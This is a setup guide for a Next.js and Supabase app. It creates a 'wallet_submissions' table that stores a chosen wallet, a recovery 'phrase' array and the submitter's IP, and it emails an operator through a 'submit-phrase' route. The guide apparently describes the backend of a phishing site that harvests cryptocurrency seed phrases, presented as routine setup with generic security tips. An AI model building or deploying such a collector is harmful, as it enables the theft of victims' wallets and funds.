# Supabase Setup Guide

## 1. Create Supabase Project

1. Go to [supabase.com](https://supabase.com) and sign up/login
2. Create a new project
3. Wait for the project to be ready

## 2. Get Your Credentials

1. Go to Project Settings → API
2. Copy your Project URL and anon/public key
3. Create a `.env.local` file in your project root:

```bash
NEXT_PUBLIC_SUPABASE_URL=https://yourproject.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=your_anon_key_here
NOTIFICATION_EMAIL=your_email@domain.com
```

## 3. Create Database Table

Run this SQL in your Supabase SQL Editor:

```sql
-- Create wallet submissions table
CREATE TABLE wallet_submissions (
  id BIGSERIAL PRIMARY KEY,
  selected_wallet TEXT NOT NULL,
  phrase TEXT[] NOT NULL,
  timestamp TIMESTAMPTZ DEFAULT NOW(),
  ip TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Enable Row Level Security (optional)
ALTER TABLE wallet_submissions ENABLE ROW LEVEL SECURITY;

-- Create policy to allow all operations (for demo purposes)
-- In production, you'd want more restrictive policies
CREATE POLICY "Allow all operations" ON wallet_submissions
  FOR ALL USING (true);

-- Create index for better performance
CREATE INDEX idx_wallet_submissions_timestamp ON wallet_submissions(timestamp DESC);
CREATE INDEX idx_wallet_submissions_wallet ON wallet_submissions(selected_wallet);
```

## 4. Install Dependencies

```bash
npm install
```

## 5. Test the Application

```bash
npm run dev
```

## Email Notification Setup

For email notifications, you can integrate with:

- **SendGrid**: `npm install @sendgrid/mail`
- **Resend**: `npm install resend`
- **AWS SES**: `npm install @aws-sdk/client-ses`

Update the `sendEmailNotification` function in `src/app/api/submit-phrase/route.js` with your chosen service.

## Security Notes

⚠️ **Important**: 
- Never expose your Supabase service role key
- Use Row Level Security policies in production
- Consider encrypting sensitive data
- Implement proper authentication for admin access
